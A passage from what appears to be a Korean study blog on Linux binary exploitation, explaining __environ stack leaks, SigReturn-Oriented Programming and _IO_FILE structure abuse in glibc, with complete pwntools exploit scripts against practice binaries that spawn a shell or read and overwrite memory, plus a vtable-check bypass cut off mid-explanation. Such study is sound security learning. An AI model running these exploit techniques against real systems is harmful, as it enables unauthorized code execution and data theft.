</code></pre>-> 임의 주소 읽기로 정보 탈취 가능</li></ul></li><li><p>exploit 방법:</p><ol><li><p>libc_base 의 주소를 계산한다.</p><ul><li><code>stdout</code> 포인터의 주소값과 offset 값을 비교하여 libc_base 의 주소값을 구한다.</li></ul></li><li><p><code>__environ</code> 변수의 주소값을 구한다.</p><ul><li>libc_base 주소값에서 <code>__environ</code> 변수의 offset 을 더하여 구한다.</li></ul></li><li><p>탈취할 데이터가 저장된 주소를 계산한다.</p><ul><li>프로그램에서 <code>read</code> 함수를 이용해 데이터를 읽어 오므로, <code>read</code> 함수 호출시 <code>RCX</code> 레지스터의 주소를 확인하면 데이터가 저장되는 값의 주소를 알 수 있다.</li><li>gdb 를 통해 <code>read</code> 함수 호출 당시 <code>RCX</code> 레지스터의 주소를 확인하고, 이를 <code>__environ</code> 변수의 주소와 비교하여 offset 을 구한다.<pre tabindex=0><code>  0x555555400a21 &lt;read_file+43&gt;    call   open@plt                &lt;open@plt&gt;

  0x555555400a26 &lt;read_file+48&gt;    mov    dword ptr [rbp - 0x1014], eax
  0x555555400a2c &lt;read_file+54&gt;    lea    rcx, [rbp - 0x1010]
► 0x555555400a33 &lt;read_file+61&gt;    mov    eax, dword ptr [rbp - 0x1014]
  0x555555400a39 &lt;read_file+67&gt;    mov    edx, 0xfff
  0x555555400a3e &lt;read_file+72&gt;    mov    rsi, rcx
  0x555555400a41 &lt;read_file+75&gt;    mov    edi, eax
  0x555555400a43 &lt;read_file+77&gt;    call   read@plt                &lt;read@plt&gt;
  ...
  pwndbg&gt; x/g $rcx
  0x7fffffffd190: 0
  pwndbg&gt; x/g $rcx
  0x7fffffffd190: 0
  pwndbg&gt; p/x 0x7fffffffe6c8 - 0x7fffffffd190
  $1 = 0x1538
</code></pre><ul><li>예시에서는 offset 이 0x1538이다.</li></ul></li></ul></li><li><p>추출한 주소에 저장된 값을 임의 주소 읽기 취약점으로 획득한다.</p></li></ol></li><li><p>전체 코드</p><pre tabindex=0><code>#!/usr/bin/env python3
from pwn import *

p = process(&#39;./environ&#39;)
elf = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

# GDB를 통해 확인한 정보
OFFSET_FROM_ENVIRON_TO_BUFFER = 0x1538

p.recvuntil(b&#39;stdout: &#39;)
stdout = int(p.recvuntil(b&#39;\n&#39;), 16)  # stdout 주소 획득(편의를 위해 예시에서 제공)
libc_base = stdout - elf.symbols[&#39;_IO_2_1_stdout_&#39;]  # libc_base 주소 계산
libc_environ = libc_base + elf.symbols[&#39;__environ&#39;]  # __environ 변수 주소 계산
print(&#39;libc_base:&#39;, hex(libc_base))
print(&#39;libc_environ:&#39;, hex(libc_environ))

# 임의 주소 읽기를 위한 값 입력
p.sendlineafter(b&#39;&gt; &#39;, b&#39;1&#39;)
print(&#39;encoded libc_environ:&#39;, str(libc_environ).encode())
p.sendlineafter(b&#39;Addr: &#39;, str(libc_environ).encode())  # __environ 변수가 가리키는 값 출력 유도

stack_environ = p.recv(6)
print(&#39;raw stack_environ:&#39;, stack_environ)
stack_environ = u64(stack_environ.ljust(8, b&#39;\x00&#39;))  # printf(&#34;%s&#34;, (char *)addr); 에서 전달된 값 파&gt;싱
# stack_environ 은 __environ 변수가 가리키는 stack 의 주소
print(&#39;stack_environ:&#39;, hex(stack_environ))

file_content = stack_environ - OFFSET_FROM_ENVIRON_TO_BUFFER  # 데이터가 저장된 stack 주소 계산
print(&#39;file_content:&#39;, hex(file_content))
# 임의 주소 읽기를 위한 값 입력
p.sendlineafter(b&#39;&gt; &#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;:&#39;, str(file_content).encode())  # 최종적으로 원하는 값 획득

p.interactive()
</code></pre></li></ul><h3 id=sigreturn-oriented-programming-srop>SigReturn-Oriented Programming (SROP)<a hidden class=anchor aria-hidden=true href=#sigreturn-oriented-programming-srop>#</a></h3><ul><li><p>운영체제는 <code>User Mode</code> 와 <code>Kernel Mode</code> 가 존재하고, 각 모드에서 수행할 수 있는 동작의 제약이 다르다.</p></li><li><p>시그널이 발생하면 시그널에 해당하는 코드가 <code>Kernel Mode</code> 에서 실행되고, 다시 <code>Usesr Mode</code> 로 시스템의 흐름이 전환된다.</p></li><li><p><code>Kernel Mode</code> 에서 <code>User Mode</code> 로 전환되기 위해서는 Signal 이 발생한 시점의 프로그램 정보(레지스터, 메모리, 등) 가 기록되어야 한다.</p></li><li><p>Signal 이 발생하면 <code>arch_do_signal_or_restart</code> 함수가 호출된다. 함수 이름은 Linux 버전에 따라 상이할 수 있다.</p><ul><li><code>do_signal</code>(Linux 5.8 이하)</li><li><code>arch_do_signal</code>(Linux 5.10 이하)</li><li><code>arch_do_signal_or_restart</code>(Linux 5.10 초과)</li></ul></li><li><p><code>arch_do_signal_or_restart</code> 함수는 <code>get_signal</code> 을 호춣하고, signal handler 가 등록되어 있다면 <code>handle_signal</code> -> <code>setup_rt_frame</code> -> <code>signal_setup_done</code> 을 차례로 호출한다.</p><ul><li><code>setup_rt_frame</code> 함수는 <code>setup_rt_frame(ksig, regs)</code> 형태로 호출되는데, <code>regs->si</code>, <code>regs->dx</code>, <code>regs->ip</code>, <code>regs->sp</code> 에 알맞은 값을 집어넣어 등록한 signal handler 함수가 호출될 수 있도록 설정한다.</li></ul></li><li><p><code>Kernel Mode</code> 에서 <code>User Mode</code> 로 context switching 을 하기 위해서는 signal을 처리하기 전에 <code>sigreturn</code> 시스템 콜을 호출하여 당시 프로그램 정보를 기록한다.</p></li><li><p><code>sigreturn</code> 이 호출되면 <code>restore_sigcontext</code> 함수에서 현재 스택의 값을 레지스터에 복제한다. 이렇게 기록된 값을 사용하여 signal 발생 직전의 상태로 context switching 을 수행할 수 있다.</p><ul><li><code>sigcontext</code> 구조체에 있는 각 멤머 변수에 데이터를 삽입하는데, 이는 레지스터에 데이터를 집어넣는 것이라 보면 된다.</li></ul></li><li><p><code>SROP</code> 란, 위에서 설명한 <code>sigreturn</code> 시스템 콜을 사용한 <code>ROP (Return Oriented Programming)</code> 기법으로, 스택에 임의의 값을 미리 채워놓고, <code>sigreturn</code> 호출을 유도한 이후 <code>User Mode</code> 로 context switching 될 때 원하는 함수가 실행되도록 하는 exploit 방법이다.</p></li></ul><h4 id=exploit-예시-5>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시-5>#</a></h4><ol><li><p>buffer overflow를 이용하여 <code>sigreturn</code> 이 호출되도록 gadget 을 주입한다.</p><ul><li><code>sigreturn</code> 시스템콜은 15번 system call 이기 때문에, stack overflow 를 발생시켜 RIP 레지스터에 <code>pop rax; syscall; ret</code> 가젯을 집어넣고, RAX 레지스터를 15 로 변경하면, 함수 stack 이 종료될 때 <code>sigreturn</code> 시스템 콜이 호출된다.</li></ul></li><li><p>&ldquo;/bin/bash&rdquo; 문자열을 주입하기 위해 <code>sigreturn</code> 으로 <code>read(0, bss, 0x1000)</code> 를 먼저 호출한다.</p></li><li><p>bss 에 저장된 데이터를 활용하여 <code>sigreturn</code>를 한번 더 호출해 <code>execve("/bin/bash")</code> 구문이 실행되도록 한다.</p></li></ol><ul><li>전체 코드<pre tabindex=0><code>from pwn import *
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
context.arch = &#39;x86_64&#39;
p = process(&#39;srop&#39;)
elf = ELF(&#39;./srop&#39;)

gadget = next(elf.search(asm(&#39;pop rax; syscall&#39;)))  # 코드상에 있는 내용 사용한 것
print(&#39;gadget:&#39;, hex(gadget))
payload = b&#39;A&#39;*16  # BUFFER overflow
payload += b&#39;B&#39;*8  # SFP
payload += p64(gadget)  # return address
payload += p64(15) # sigreturn, pop rax 동작으로 rax에 채워질 값

# read(0, bss, 0x1000)  에 해당하는 gadget 생성, 충분한 길이를 위해 0x1000 byte read
# read를 한번 더 수행해서 &#34;/bin/bash&#34; string 을 bss 영역에 입력하기 위해 gadget 세팅
bss = elf.bss()
syscall = next(elf.search(asm(&#39;syscall&#39;)))
frame = SigreturnFrame()
frame.rdi = 0        # argv1
frame.rsi = bss      # argv2
frame.rdx = 0x1000   # argv3
frame.rax = 0        # SYS_read
frame.rip = syscall  # syscall 명령어 실행
frame.rsp = bss      # stack 주소를 bss 위치로 변경

payload += bytes(frame)  # sigcontext 값 주입

p.sendline(payload)  # overflow 유발

# execve(&#39;/bin/sh&#39;, 0, 0) 에 해당하는 gadget 생성
frame2 = SigreturnFrame()
# frame2.rdi = bss + ?  # argv1, &#39;/bin/sh&#39; 가 담긴 위치를 넣어야 한다.
# rsi, rdx는 default 로 0
frame2.rip = syscall  # syscall 명령어 실행
frame2.rax = 0x3b # execve 번호
frame2.rsp = bss + 0x500  # 충분한 버퍼를 두고 stack의 top을 bss 위치로 이동

rop = p64(gadget)  # sigreturn 호출하기 위한 gadget
rop += p64(15)  # RAX로 pop 될 위치에 sigreturn 번호 주입

frame2.rdi = bss + len(frame2) + len(rop)  # bss + 0x108, argv1, &#39;/bin/sh&#39; 가 담긴 위치.

print(&#39;rdi:&#39;, bss, &#39;+&#39;, len(frame2) + len(rop))
rop += bytes(frame2)  # sigcontext 값 주입
rop += b&#39;/bin/sh\x00&#39;

p.sendline(rop)  # 호출된 reaed(0, bss, 0x1000) 함수에 의한 입력값 입력

p.interactive()
</code></pre></li></ul><h3 id=_io_file>_IO_FILE<a hidden class=anchor aria-hidden=true href=#_io_file>#</a></h3><ul><li><code>fopen</code> 으로 파일을 열면 파일의 모드(read, write, &mldr;), 파일 작업을 위한 함수의 주소 등을 파일 포인터(<code>FILE *</code>)로 전달받는다.</li><li>표준 라이브러리의 <code>FILE</code> 구조체는 은 <code>typedef struct IO_FILE FILE</code> 구문에 의해 정의된 것이며, 리눅스에서 <code>fopen</code> 함수를 호출하면 힙 영역에 <code>_IO_FILE</code> 구조체가 할당된다.<ul><li><code>_IO_FILE</code> 구조체 형태<pre tabindex=0><code>struct _IO_FILE
{
  int _flags;		/* 파일에 대한 읽기/쓰기/추가 권한. 0xfbad0000 값(_IO_MAGIC)을 매직 값으로, 하위 2바이트는 비트 플래그로 사용 */ 
  char *_IO_read_ptr;	/* 파일 읽기 버퍼 포인터 */
  char *_IO_read_end;	/* 파일 읽기 버퍼 주소의 끝 포인터 */
  char *_IO_read_base;	/* 파일 읽기 버퍼 주소의 시작 포인터 */
  char *_IO_write_base;	/* 파일 쓰기 버퍼에 대한 시작 포인터 */
  char *_IO_write_ptr;	/* 파일 쓰기 버퍼 포인터 */
  char *_IO_write_end;	/* 파일 쓰기 버퍼 주소의 끝 포인터 */
  char *_IO_buf_base;	/* Start of reserve area */
  char *_IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;  /* 파일 디스크립터 값 */
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
  /* _IO_USE_OLD_IO_FILE 가 정의되어있다면 여기까지만 사용 */
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don&#39;t get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];

};
</code></pre></li></ul></li><li><code>fopen</code> 함수를 호출하면 <code>_IO_new_file_fopen</code> 에서 <code>mode</code> 인자의 값이 &lsquo;r&rsquo;, &lsquo;w&rsquo;, &lsquo;a&rsquo; 중 어느 것인지 확인하고 flag 에 비트를 할당한다.<ul><li>flag 종류<pre tabindex=0><code>#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don&#39;t deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don&#39;t call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000 /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000
</code></pre></li></ul></li><li><code>_IO_FILE</code> 구조체를 담고있는 <code>_IO_FILE_plus</code> 구조체에는 <code>_IO_jump_t *vtable</code> 포인터가 있는데, 이 포인터에 파일 처리 관련 동작을 수행하는 함수의 주소가 연결된다.<ul><li><code>_IO_FILE_plus</code> 형태<pre tabindex=0><code>struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
</code></pre></li><li>모든 파일 관련 함수는 vtable 에 의해 호출된다.<pre tabindex=0><code># 64bit 운영체제 기준 크기
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);  # 8byte
    JUMP_FIELD(size_t, __dummy2);  # 8byte
    JUMP_FIELD(_IO_finish_t, __finish);  # 8byte
    JUMP_FIELD(_IO_overflow_t, __overflow);  # 8byte
    JUMP_FIELD(_IO_underflow_t, __underflow);  # 8byte
    JUMP_FIELD(_IO_underflow_t, __uflow);  # 8byte
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);  # 8byte
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);  # 8byte
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);  # 8byte
    JUMP_FIELD(_IO_seekoff_t, __seekoff);  # 8byte
    JUMP_FIELD(_IO_seekpos_t, __seekpos);  # 8byte
    JUMP_FIELD(_IO_setbuf_t, __setbuf);  # 8byte
    JUMP_FIELD(_IO_sync_t, __sync);  # 8byte
    JUMP_FIELD(_IO_doallocate_t, __doallocate);  # 8byte
    JUMP_FIELD(_IO_read_t, __read);  # 8byte
    JUMP_FIELD(_IO_write_t, __write);  # 8byte
    JUMP_FIELD(_IO_seek_t, __seek);  # 8byte
    JUMP_FIELD(_IO_close_t, __close);  # 8byte
    JUMP_FIELD(_IO_stat_t, __stat);  # 8byte
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);  # 8byte
    JUMP_FIELD(_IO_imbue_t, __imbue);  # 8byte
};
</code></pre></li></ul></li><li>vtable 에 연결된 함수들은 모두 동적으로 할당되는 함수들이기 때문에 공격에 악용될 수 있다.</li><li>파일 관련 함수 중, 파일을 수정할 때 사용되는 <code>fwrite</code> , <code>fputs</code> 등은 내부적으로 <code>_IO_sputn</code> 함수를 호출하게 된다.</li><li><code>_IO_sputn</code> -> <code>_IO_XSPUTN</code>-> <code>_IO_new_file_xsputn</code> -> <code>_IO_OVERFLOW</code> 순서로 함수가 호출되며, 최종적으로 <code>_IO_new_file_overflow</code> 가 호출된다.</li><li><code>_IO_new_file_overflow</code> 에서는 아래 과정을 거쳐 함수 구조체에 값을 집어넣게 된다.<ul><li><ol><li><code>if (f->_flags & _IO_NO_WRITES)</code> : 조건을 만족하면 EOF 반환후 종료</li></ol></li><li><ol start=2><li><code>if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)</code> : <code>f->_IO_write_ptr</code>, <code>f->_IO_write_base</code>, <code>f->_IO_write_end</code>, <code>f->_IO_read_base</code> 등 파일 포인터 함수들을 설정</li></ol></li><li>인자로 받은 파일 구조체(<code>_IO_FILE</code>)에서 <code>_flags</code> 를 확인하여 쓰기 권한(<code>_IO_CURRENTLY_PUTTING</code>)이 없다면 <code>_IO_write_ptr</code>, <code>_IO_write_base</code>, <code>IO_write_end</code> 등의 값을 다른 값으로 치환한다.</li></ul></li><li>쓰기 권한이 있다면, 파일 구조체를 인자로 <code>_IO_do_write</code> -> <code>new_do_write</code> 을 호출하고, <code>_flags</code> 에서 append 권한(<code>_IO_IS_APPENDING</code>) 을 확인한 후 <code>_IO_SYSWRITE</code> 을 호출하게 되는데, 이 <code>_IO_SYSWRITE</code> 함수가 <code>vtable</code> 의 <code>_IO_new_file_write</code> 가 가키리는 함수이다.</li><li><code>_IO_new_file_write</code> 에 전달되는 파일 구조체를 &lsquo;f&rsquo; 라 하면, <code>write(f->_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base);</code> 구문으로 파일에 데이터를 작성한다.</li></ul><h4 id=exploit-예시-6>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시-6>#</a></h4><ul><li>전제조건<ol><li>파일 포인터의 값을 덮어쓸 수 있어야 한다.<ul><li>예제에서는 일부러 파일 포인터의 주소에 read를 하는 구문이 들어있다. (<code>read(0, fp, 300);</code>)</li></ul></li><li>위에서 덮어쓴 파일 포인터를 이용한 파일 쓰기 구문을 수행한다.<ul><li>&ldquo;char[1024] flag_buf&rdquo; 변수에 데이터가 담겨있다.</li></ul></li></ol></li><li>방법<ul><li><code>fwrite</code> 함수를 이용하여 &ldquo;flag_buf&rdquo; 에 담긴 데이터를 표준 출력에 출력하도록 한다. (<code>fwrite(data, sizeof(char), sizeof(flag_buf), fp);</code>)</li></ul><ol><li>파일 구조체의 <code>_flag</code> 변수에 에 magic number <code>0xfbad0000</code> 와 <code>_IO_CURRENTLY_PUTTING</code> (0x800) 을 세팅하여 <code>_IO_new_file_overflow</code> 함수에서 부수적인 작업 없이 <code>_IO_do_write</code> 가 호출될 수 있도록 설정한다.</li><li>프로그램 실행 중 원하는 주소의 값을 읽을 수 있도록 파일 구조체의 값을 세팅한다.<ul><li><code>_IO_do_write</code> 는 최종적으로 <code>write(f->_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base);</code> 형태로 표현된다.</li><li><code>_IO_write_base</code> 를 추출하려는 데이터가 담긴 버퍼의 주소로 변경한다.</li><li><code>_IO_write_ptr</code> 를 추출하려는 데이터가 담긴 버퍼의 크기로 변경한다.</li><li><code>_fileno</code> 를 stdout 을 의미하는 1로 변환한다.</li></ul></li></ol></li><li>pwntools 코드 예제<pre tabindex=0><code>from pwn import *
p = process(&#39;./iofile_aar&#39;)
elf = ELF(&#39;./iofile_aar&#39;)
flag_buf = elf.symbols[&#39;flag_buf&#39;]  # flag 데이터가 담긴 변수
payload = p64(0xfbad0000 | 0x800)  # 파일 구조체 _flag 변수 설정 (magic number + _IO_CURRENTLY_PUTTING)
payload += p64(0) # _IO_read_ptr, 미사용
payload += p64(flag_buf) # _IO_read_end, 미사용
payload += p64(0) # _IO_read_base, 미사용
payload += p64(flag_buf) # _IO_write_base, flag 데이터가 담긴 변수의 주소
payload += p64(flag_buf + 1024) # _IO_write_ptr, flag 데이터가 담긴 변수의 주소 + 크기
payload += p64(0) # _IO_write_end, 미사용
payload += p64(0) # _IO_buf_base, 미사용
payload += p64(0) # _IO_buf_end, 미사용
payload += p64(0) # _IO_save_base, 미사용
payload += p64(0) # _IO_backup_base, 미사용
payload += p64(0) # _IO_save_end, 미사용
payload += p64(0) # struct _IO_marker, 미사용
payload += p64(0) # struct _IO_FILE, 미사용
payload += p64(1) # _fileno,  파일 디스크립터 값을 stdout 로 설정
p.sendlineafter(b&#39;Data: &#39;, payload)
p.interactive()
</code></pre></li></ul><h4 id=exploit-예시-2-1>exploit 예시 2<a hidden class=anchor aria-hidden=true href=#exploit-예시-2-1>#</a></h4><ul><li><p>전제조건</p><ol><li>파일 포인터의 값을 덮어쓸 수 있어야 한다.</li><li>덮어쓴 파일 포인터를 이용해 변수의 값을 overwrite 한다.</li><li>2번을 통해 특정 구문이 실행되도록 if 문의 조건을 조작하면 원하는 결과가 실행되는 형태로 코드가 구성되어 있다.<ul><li><code>if (조건문) { 원하는_결과 }</code> 일때, &lsquo;조건문&rsquo; 을 강제로 참으로 만들어 &lsquo;원하는_결과&rsquo; 가 실행되가 하는 것이 목표</li></ul></li></ol></li><li><p>exploit 원리:</p><ul><li>파일 내용을 읽는 함수(<code>fread</code>, <code>fgets</code>) 들은 내부적으로 <code>_IO_file_xsgetn</code> 함수(<code>_IO_xsgetn_t</code>)를 호출한다.</li><li><code>_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)</code> 가 호출되면, <code>fp->_IO_buf_end - fp->_IO_buf_base</code> 값이 <code>n</code> 보다 큰지 확인하고, 조건을 만족한다면 <code>__underflow</code> -> <code>_IO_new_file_underflow</code> 를 호출한다.<ul><li>(<code>if (fp->_IO_buf_base && want &lt; (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)))</code>)</li></ul></li><li><code>_IO_new_file_underflow(FILE *fp)</code> 가 호출되면 <code>_flags</code> 변수에 읽기 금지 flag(<code>_IO_NO_READS</code>)가 포함되어 있는지 확인하고, 포함되어있지 않다면 <code>_IO_SYSREAD</code> 를 호출한다.<ul><li>(<code>if (fp->_flags & _IO_NO_READS) return EOF;</code>)</li></ul></li><li><code>_IO_SYSREAD</code> 함수는 vtable 의 <code>_IO_file_read</code> 에 매핑되어 있다.<ul><li><code>_IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)</code> 가 호출되면 <code>read</code> 시스템 콜을 사용하여 <code>__read (fp->_fileno, buf, size))</code> 형태로 읽기를 수행한다.</li></ul></li><li>최종적으로 파일 내용을 읽는 함수(<code>fread</code>, <code>fgets</code> 등)들은 <code>read(f->_fileno, _IO_buf_base, _IO_buf_end - _IO_buf_base)</code> 형태의 함수가 호출되는 것과 같다.</li></ul></li><li><p>exploit 방법:</p><ol><li>if문의 조건에 해당하는 버퍼(&lsquo;overwrite_me&rsquo;) 의 주소를 알아낸다.</li><li>file 구조체의 값들을 overwrite 하기 위한 payload 를 작성한다.</li><li>file write 구문이 실행되었을 때, 변수에 원하는 값을 입력한다.</li></ol></li><li><p>전체 코드</p><pre tabindex=0><code>#!/usr/bin/env python3
import time
from pwn import *
p = process(&#39;./iofile_aaw&#39;)
elf = ELF(&#39;./iofile_aaw&#39;)
overwrite_me = elf.symbols[&#39;overwrite_me&#39;]  # 변수 이름으로 주소 확인
payload = p64(0xfbad0000)  # flag 에 _IO_MAGIC 설정. _IO_NO_READS(0x04) 만 포함되지 않으면 됨
payload += p64(0)  # _IO_read_ptr, 미사용
payload += p64(0)  # _IO_read_end, 미사용
payload += p64(0)  # _IO_read_base, 미사용
payload += p64(0)  # _IO_write_base, 미사용
payload += p64(0)  # _IO_write_ptr, 미사용
payload += p64(0)  # _IO_write_end, 미사용
payload += p64(overwrite_me)  # _IO_buf_base, overwrite 할 변수의 시작주소
payload += p64(overwrite_me + 1024)  # _IO_buf_end, overwrite 할 변수의 시작주소 + 크기
payload += p64(0)  # _IO_save_base, 미사용
payload += p64(0)  # _IO_backup_base, 미사용
payload += p64(0)  # _IO_save_end, 미사용
payload += p64(0)  # _markers, 미사용
payload += p64(0)  # _chain, 미사용
payload += p64(0)  # _fileno, stdin 에 해당하는 &#39;0&#39; 을 대입
p.sendlineafter(b&#39;Data: &#39;, payload)  # payload 전송, file 구조체 overwrite
time.sleep(10) # fread 작업이 수행될 때 까지 잠시 대기
p.send(p64(0xDEADBEEF) + b&#39;\x00&#39;*1024)  # overwrite_me 변수에 채워넣어야 할 값
p.interactive()
</code></pre></li></ul><h4 id=exploit-예시-3-1>exploit 예시 3<a hidden class=anchor aria-hidden=true href=#exploit-예시-3-1>#</a></h4><ul><li><p>file IO 동작시 vtable을 검증하는 과정을 bypass 시켜서 권한을 탈취하는 방법이다.(<code>bypass IO_validate_vtable</code>)</p></li><li><p>vtable에 매핑된 file IO 함수를 실행시키면 <code>IO_validate_vtable</code> 함수기 실행되는데, <code>IO_validate_vtable</code> 함수는 인자로 전달받은 <code>struct _IO_jump_t</code> 타입(vtable 함수 포인터)의 주소가 <code>__start___libc_IO_vtables</code> ~ <code>__stop___libc_IO_vtables</code> 위치 사이에 있는지 확인한다. 즉, <code>__libc_IO_vtables</code> 섹션에 할당되는지를 체크하고, 조건을 만족하지 못한다면 <code>_IO_vtable_check</code> 에러를 발생시킨다.따라서 <code>IO_validate_vtable</code> 검증 함수가 생긴 이후로는 vtable 포인터를 아무 함수로 덮어 써서 공격할 수 없게 되었다.</p></li><li><p><code>IO_validate_vtable</code> 의 포인터 주소 검사를 우회할 수 있는 함수중 하나는 <code>_IO_str_overflow</code> 함수가 있다. <code>_IO_str_overflow</code> 함수는 vtable에 <code>JUMP_FIELD(_IO_overflow_t, __overflow);</code> 형태로 정의된 함수이기 때문에 주소 검사에서 통과된다.</p></li><li><p><code>_IO_str_overflow</code> 함수 내부에서는 <code>new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);</code> 구문이 실행되는데, <code>_allocate_buffer</code> 와 <code>new_size</code> 를 잘 조작하여 <code>system('/bin/bash')</code> 형태로 변경하면 exploit 이 가능하다.</p><ul><li><code>_s._allocate_buffer</code> 은 vtable 의 첫 8byte에 위치한다 (<code>JUMP_FIELD(size_t, __dummy);</code> 형태). vtable의 첫 8byte에 <code>system</code> 함수를 대입시키면 된다.</li><li><code>new_size</code> 는 <code>2 * (_IO_buf_end - _IO_buf_base) + 100</code> 값이 적용된다 (<code>old_blen = (fp)->_IO_buf_end - (fp)->_IO_buf_base; _IO_size_t new_size = 2 * old_blen + 100;</code> 구문). <code>_IO_buf_end</code> 를 라이브러리의 <code>/bin/sh</code> 문자열이 저장된 주소로 치환하고, <code>_IO_buf_base</code> 를 0 으로 덮어쓰면 된다.</li></ul></li><li><p>전제조건</p><ol><li>코드에서 std 라이브러리 구성요소의 주소를 확인할 수 있다. (예시에서는 라이브러리 릭 과정을 생략하기 위해 stdout을 미리 출력하도록 세팅되었다.)</li><li>파일 포인터를 덮어쓸 수 있다.</li><li>fclose 를 호출한다. (fclose 외 다른 파일 구조체 함수도 적용 가능)</li></ol></li><li><p>exploit 방법</p><ol><li><p>라이브러리 릭을 통해 _IO_jump_t 구조체의 주소를 획득한다. (유출된 stdout 의 주소로 _IO_jump_t 정의 부분 주소를 획득)</p></li><li><p><code>fclose</code> 는 <code>_IO_FINISH</code> -> <code>_IO_finish_t</code> 순서대로 함수를 호출하는데, <code>_IO_finish_t</code>은 vtable + 16byte (즉 <code>JUMP_FIELD(_IO_finish_t, __finish);</code> 형태로 정의된 함수) 에 위치한 함수를 호출한다. FILE 포인터를 overwrite 할 때 vtable 의 시작 주소를 조작하여 <code>_IO_finish_t</code> 의 위치에 <code>_IO_str_overflow</code> 함수의 주소가 오도록 설정한다.</p><ul><li>그러면 fclose 호출시 <code>_IO_str_overflow</code> 가 호출되고, <code>s._allocate_buffer) (new_size)</code> 구문이 실행된다. vtable 함수를 그대로 사용하였기 때문에 <code>IO_validate_vtable</code> 검사도 통과할 수 있다.</li><li><code>_IO_file_jumps</code> + 0xC0 에 위치한 구조체는 <code>_IO_str_jumps</code>의 구조체로, <code>_IO_str_jumps</code> + 0x18 위치에 <code>_IO_str_overflow</code> 가 있다.<ul><li>참고: <code>_IO_file_overflow</code> 와 <code>_IO_str_overflow</code> 는 같은 위치를 가리키지만, <code>_IO_file_overflow</code> 로 exploit을 시도하면 실패했다.</li><li>gdb 에서 <code>_IO_file_jumps</code> 구조체의 주소를 확인하고, 그 주소에 적힌 값들을 출력해 보면 <code>_IO_file_jumps</code> 의 주소가 &ldquo;0x7ffff7dca2a0&rdquo; 일 때, &ldquo;0x7ffff7dca2a0 + 0xC0&rdquo; 위치의 값들과 형태가 유사한 것을 확인 할 수 있다.</li></ul></li></ul><pre tabindex=0><code> pwndbg&gt; p &amp;_IO_file_jumps
 $5 = (const struct _IO_jump_t *) 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;
 pwndbg&gt; tele (0x7ffff7dca2a0)
 00:0000│  0x7ffff7dca2a0 (_IO_file_jumps) ◂— 0x0
 01:0008│  0x7ffff7dca2a8 (_IO_file_jumps+8) ◂— 0x0
 02:0010│  0x7ffff7dca2b0 (_IO_file_jumps+16) —▸ 0x7ffff7a6e2d0 (_IO_file_finish) ◂— push rbp
 03:0018│  0x7ffff7dca2b8 (_IO_file_jumps+24) —▸ 0x7ffff7a6f2b0 (_IO_file_overflow) ◂— mov ecx, dword ptr [rdi]
 04:0020│  0x7ffff7dca2c0 (_IO_file_jumps+32) —▸ 0x7ffff7a6efd0 (_IO_file_underflow) ◂— mov eax, dword ptr [rdi]
 05:0028│  0x7ffff7dca2c8 (_IO_file_jumps+40) —▸ 0x7ffff7a70370 (_IO_default_uflow) ◂— push rbp
 06:0030│  0x7ffff7dca2d0 (_IO_file_jumps+48) —▸ 0x7ffff7a71c00 (_IO_default_pbackfail) ◂— push r15
 07:0038│  0x7ffff7dca2d8 (_IO_file_jumps+56) —▸ 0x7ffff7a6d8d0 (_IO_file_xsputn) ◂— push r15
 pwndbg&gt; tele (0x7ffff7dca2a0+0xc0)
 00:0000│  0x7ffff7dca360 (_IO_str_jumps) ◂— 0x0
 01:0008│  0x7ffff7dca368 (_IO_str_jumps+8) ◂— 0x0
 02:0010│  0x7ffff7dca370 (_IO_str_jumps+16) —▸ 0x7ffff7a722a0 (_IO_str_finish) ◂— push rbx
 03:0018│  0x7ffff7dca378 (_IO_str_jumps+24) —▸ 0x7ffff7a71f10 (_IO_str_overflow) ◂— mov ecx, dword ptr [rdi]
